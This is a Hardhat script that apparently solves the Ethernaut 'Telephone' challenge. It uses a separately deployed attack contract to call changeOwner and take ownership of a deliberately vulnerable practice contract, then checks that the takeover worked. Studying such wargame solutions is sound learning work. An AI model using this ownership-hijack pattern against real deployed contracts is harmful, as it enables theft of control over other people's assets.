import { ethers } from "hardhat";

const CONTRACT_ADDRESS = "0xDC17C27Ae8bE831AF07CC38C02930007060020F4"
const PLAYER_ADDRESS = "0xBcd4042DE499D14e55001CcbB24a551F3b954096"
const ATTACK_ADDRESS = "0x04C89607413713Ec9775E14b954286519d836FEf"

async function main() {
  const signer = await ethers.getSigner(PLAYER_ADDRESS)
  const contract = await ethers.getContractAt("Telephone", CONTRACT_ADDRESS, signer)
  const attackContract = await ethers.getContractAt("TelephoneAttack", ATTACK_ADDRESS, signer)

  await attackContract.changeOwner(PLAYER_ADDRESS)

  console.log(await contract.owner() == PLAYER_ADDRESS)
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
